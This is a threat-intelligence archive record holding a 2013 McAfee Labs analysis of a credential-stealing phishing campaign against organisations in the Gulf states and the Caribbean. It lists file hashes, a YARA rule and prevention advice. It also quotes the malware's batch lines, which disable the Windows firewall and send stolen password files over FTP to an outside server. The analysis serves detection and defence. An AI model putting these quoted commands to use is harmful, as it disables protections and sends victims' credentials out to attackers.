{
    "id": "909749aa-0ab3-4e0f-b990-9357332bc843",
    "created_at": "2022-10-25T16:48:23.833677Z",
    "updated_at": "2025-03-27T02:05:28.848503Z",
    "deleted_at": null,
    "sha1_hash": "11b8d957363188bd334bd88b1f5630abc263523b",
    "title": "Targeted Campaign Steals Credentials in Gulf States and Caribbean",
    "authors": "",
    "file_creation_date": "2020-12-22T07:21:54Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 54124,
    "plain_text": "# Targeted Campaign Steals Credentials in Gulf States and Caribbean\n\n**[kashifali.ca/2013/07/01/targeted-campaign-steals-credentials-in-gulf-states-and-caribbean](https://www.kashifali.ca/2013/07/01/targeted-campaign-steals-credentials-in-gulf-states-and-caribbean/)**\n\nMcAfee Labs July 1, 2013\n\nLast week, McAfee’s Foundstone Incident Response team got hold of a piece of malware\nthat was sent out during a phishing campaign. The campaign targeted several\ncompanies and institutes in the United Arab Emirates, Oman, Bahrain, and a couple of\nCaribbean islands.\n\nThe executable that was sent with the email was called emiratesstatement.exe and the\npictogram of the executable tried to impersonate itself as a PDF.\n\nFile: emiratestatement.exe\nSize: 3,325,952 bytes\nMD5: 0E37B6EFE5DE1CC9236017E003B1FC37\n\nA sample, more than 3MB, is strange. Normally malware samples are less than 1MB.\nAnalyzing the malware, we retrieved a simple XOR key to decrypt the contents of this\nfile:\n\n\npic1_xor_decryption\n\n\nWhile running this malware through behavioral analysis we extracted more than 14 files\nfrom this executable:\n\naatd.bat 48d6afe2dcb0a98819c1c76cd3cd054d\n\nbms.klm 3268e2c9998a27902151b19eb5a0d8f4\n\ncond.reg 631729880e3feedc0454cddc5014ef7d\n\ndd.vbs cdc8adfcdf51b0e91b56c85f4a5f041d\n\nicd.bat 9e3ff6bf3ac3d989db6e306710bab1b8\n\nictd.bat 4d7f254f7046e151dde6618d5561d31d\n\nied.bat f7cb74f59c4f55005f26e43dd146209a\n\niewed.bat 1af2ab442e95630ee768a2b83868fd60\n\nimage.exe a28b22acf2358e6aced43a6260af9170\n\nkeeprun.ini 07ec8b360e188bbcf2013a5e3a220e5d\n\nmsnd.exe 6f506d7adfcc2288631ed2da37b0db04\n\n\n-----\n\npicture viewer.exe 8aebade47dc1aa9ac4b5625acf5ade8f\n\npid.PDF 3bb044c0480af11e5bf466f9f253e2a9\n\nsad.vbs 12a5bdd999d105691555e72100d9b4e9\n\nEach of them had several roles in the process of execution and relation. The key\ncomponents:\n\nMsnd.exe: a keylogger writing the output to a TMP file\nImage.exe: mail password recovery tool written by SecurityXploded\nPicture viewer.exe: browser password recovery tool written by SecurityXploded\n\nThe malware tries two options to install itself:\n\nInstalling the msnd keylogger and activating the password recovery tools\nOpening the pid.PDF file. This PDF will open a PDF reader and the malware will\ninject itself into this process and activate the password-recovery tools.\n\nDuring the malware’s installation, it disables the Windows firewall by using two simple\n.bat scripts containing the following code:\n\n_@netsh firewall set opmode disable_\n_@cls_\n_@netsh advfirewall set currentprofile state off_\n\nAfter gathering all the recovered passwords and writing them to output files, these files\nare converted to files starting with the prefix PIC- followed by the date/time and a\nnumerical indicator:\n\n_@set d=%date:~-4,4%%date:~-7,2%%date:~0,2%_\n_@set d=%d: =_%_\n_@set t=%time:~0,2%%time:~3,2%%time:~6,2%_\n_@set t=%t: =0%_\n_@RENAME “msn.klm” “PIC_%d%_%t%.014″_\n_@cls_\n_@RENAME “wmsn.klm” “PIC_%d%_%t%.015″_\n\nAfter these files are created, an FTP session transfers the files to this FTP server:\n\n_@start /b ftp -i -v -s:bms.klm ftp.freehostia.com_\n\nA visual representation of the malware and the relations with the different modules:\n\n\npic2_working_malware\n\n\nThe FTP site contained several folders with the PIC*.* files:\n\n\n-----\n\nFolders containing the PIC files:\n\n\npic3_ftp_folder\n\n\npic4_ftp_listing\n\nBy analyzing the output files, we found\nthe targets of this campaign were situated\nin the United Arab Emirates, Bahrain, Oman, and a couple of Caribbean islands. The\nvictims ranged from local government entities to companies operating in the telecom\nsector, IT, travel, and natural resources. The credentials the criminals acquired\ncontained usernames and passwords for a variety of sites:\n\nWebmail of the victim’s institute/company\nFacebook\nHotmail\nInternal CRM system\nNews-site logins\nTravel reservation systems\nE-services for governmental institutes\nFirewall logins\nTender site logins\n\nYara rule to detect the malware:\n\nrule EmiratesStatement :\n{\nmeta:\nauthor = “Christiaan Beek”\ndate = “2013-06-30″\ndescription = “Credentials Stealing Attack”\nhash0 = “0e37b6efe5de1cc9236017e003b1fc37″\nhash1 = “a28b22acf2358e6aced43a6260af9170″\nhash2 = “6f506d7adfcc2288631ed2da37b0db04″\nhash3 = “8aebade47dc1aa9ac4b5625acf5ade8f “\n\nstrings:\n$string0 = “msn.klm”\n$string1 = “wmsn.klm”\n$string2 = “bms.klm”\ncondition:\nall of them\n}\n\nTo prevent these kinds of attacks:\n\nUsers should not click on files attached to an email that are sent by unknown\npersons\n\n\n-----\n\nBlock emails at the email gateway/mail server that contain an executable file\nImplement a spam filter that regularly imports up-to-date threat intelligence\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2013/2013.07.01.Gulf_States_APT/kashifali.ca-Targeted%20Campaign%20Steals%20Credentials%20in%20Gulf%20States%20and%20Caribbean.pdf"
    ],
    "report_names": [
        "kashifali.ca-Targeted Campaign Steals Credentials in Gulf States and Caribbean"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716503,
    "ts_updated_at": 1743041128,
    "ts_creation_date": 1608621714,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/11b8d957363188bd334bd88b1f5630abc263523b.pdf",
        "text": "https://archive.orkl.eu/11b8d957363188bd334bd88b1f5630abc263523b.txt",
        "img": "https://archive.orkl.eu/11b8d957363188bd334bd88b1f5630abc263523b.jpg"
    }
}